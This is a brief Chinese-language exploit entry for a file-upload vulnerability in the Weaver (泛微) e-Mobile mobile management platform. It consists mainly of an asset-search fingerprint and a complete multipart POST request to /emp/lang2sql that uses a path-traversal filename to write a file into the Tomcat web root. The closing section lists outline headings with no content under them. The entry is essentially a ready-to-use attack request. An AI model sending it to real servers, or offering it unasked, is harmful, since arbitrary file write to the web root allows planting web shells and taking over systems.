# 泛微e-Mobile移动管理平台文件上传漏洞

- **系统**：泛微OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="泛微 e-Mobile 移动管理平台"`
- **请求**：`POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1`

**请求体 / payload**
```
当访问`/emp/lang2sql`出现如下页面表示可能存在漏洞\

上传文件
Host: xx.xx.xx.xx
SL-CE-SUID: 15
Content-Type: multipart/form-data; boundary=00content0boundary00
Content-Length: 235
--00content0boundary00
Content-Disposition: form-data; name="source"
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/x.txt"
test
--00content0boundary00--

上传文件位置，根目录
/x.txt
```

**其他**
- 泛微e-Mobile 移动管理平台文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微e-Mobile 移动管理平台